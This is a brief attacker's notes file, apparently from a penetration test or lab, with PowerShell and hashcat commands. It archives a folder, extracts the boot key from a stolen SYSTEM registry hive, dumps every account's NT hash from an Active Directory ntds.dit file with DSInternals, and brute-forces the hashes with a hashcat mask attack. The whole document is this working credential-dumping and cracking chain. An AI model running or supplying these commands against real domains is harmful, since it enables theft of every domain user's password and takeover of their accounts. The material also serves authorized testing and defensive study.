#https://www.dsinternals.com/en/


```powershell
Compress-Archive -Path C:\Users\Public\Downloads\poon -DestinationPath C:\Users\Public\Downloads\poon.zip
```


#Install-Module DSInternals -Force

```powershell
Import-Module DSInternals
$Key = Get-BootKey -SystemHiveFilePath C:\Users\p4yl0ad\Desktop\AD\poon\registry\SYSTEM
 
Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\ntds.dit' -All |
  Format-Custom -View HashcatNT | 
  Out-File C:\Users\p4yl0ad\Desktop\AD\poon\Hashdump.txt
 ```

hashcat -m 1000 -a 3 --custom-charset1=?l?d?u --username -o cracked.txt .\Hashdump.txt ?1?1?1?1?1?1?1?1
